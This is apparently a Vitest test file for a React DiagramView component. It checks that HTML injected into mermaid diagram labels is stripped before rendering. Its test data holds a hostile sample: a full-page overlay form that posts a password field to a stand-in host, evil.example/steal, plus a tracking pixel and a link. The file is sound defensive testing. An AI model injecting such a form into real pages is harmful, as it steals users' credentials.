import { render, screen } from '@testing-library/react'
import { beforeAll, describe, expect, it } from 'vitest'
import { DiagramView } from './DiagramView'

/**
 * These tests drive the real `mermaid` library through the component, not a stand-in: what the library does with a label (it
 * writes it as HTML into a `foreignObject`) and what the page keeps of it is the whole point. jsdom does no layout, so the two
 * measuring calls the library makes on SVG text get a fixed answer.
 */
beforeAll(() => {
  const prototype = window.SVGElement.prototype as unknown as Record<string, unknown>
  prototype.getBBox = () => ({ x: 0, y: 0, width: 80, height: 20 })
  prototype.getComputedTextLength = () => 80
})

/** A label with a live form: every kind of control, an external action, a style that covers the page, a link and an image. */
const FORM =
  '<form action="https://evil.example/steal" method="post" style="position:fixed;inset:0;background:white">' +
  '<input name="p" type="password"><button>Sign in</button><textarea>t</textarea><select><option>1</option></select><label>l</label>' +
  '<img src="https://evil.example/pixel.png"></form><a href="https://evil.example" style="color:red">link</a>'

const DIAGRAMS: Record<string, string> = {
  'a flowchart node': `graph TD\n A["Node text ${FORM}<b>bold</b>"] --> B[Plain]`,
  'a flowchart edge': `graph TD\n A -->|"Edge text ${FORM}"| B`,
  'a subgraph title': `graph TD\n subgraph S["Group text ${FORM}"]\n A --> B\n end`,
  'a markdown label': `graph TD\n A["\`**Markdown text** ${FORM}\`"] --> B`,
  'a state': `stateDiagram-v2\n [*] --> S1\n S1: State text ${FORM}\n S1 --> [*]`,
  'an entity relation': `erDiagram\n CUSTOMER ||--o{ ORDER : "Relation text ${FORM}"`,
  'a block': `block-beta\n a["Block text ${FORM}"] b`,
}

describe('DiagramView with the real library', () => {
  it.each(Object.entries(DIAGRAMS))(
    'draws %s without a form, a control, a link or an image from its text',
    async (_name, source) => {
      render(<DiagramView source={source} label="Flow" failedMessage="Could not draw it." />)

      const host = await screen.findByRole('img', { name: 'Flow' }, { timeout: 55_000 })

      expect(host.querySelector('svg')).not.toBeNull()
      expect(host.querySelector('foreignObject')).not.toBeNull()
      expect(host.textContent).toMatch(/(Node|Edge|Group|Markdown|State|Relation|Block) text/)
      for (const tag of ['form', 'input', 'button', 'textarea', 'select', 'option', 'label', 'a', 'img', 'iframe', 'script']) {
        expect(host.querySelector(tag), tag).toBeNull()
      }
      // Only the layout styles of the library's own label wrappers are left inside a label.
      for (const label of host.querySelectorAll('foreignObject')) {
        expect(label.outerHTML).not.toMatch(/position|inset|background|evil\.example/)
      }
      expect(host.innerHTML).not.toContain('evil.example')
    },
    90_000,
  )

  it('keeps the formatting an author gives a label', async () => {
    render(<DiagramView source={DIAGRAMS['a flowchart node']!} label="Flow" failedMessage="Could not draw it." />)

    const host = await screen.findByRole('img', { name: 'Flow' }, { timeout: 55_000 })

    expect(host.querySelector('foreignObject b')).toHaveTextContent('bold')
  }, 90_000)
})
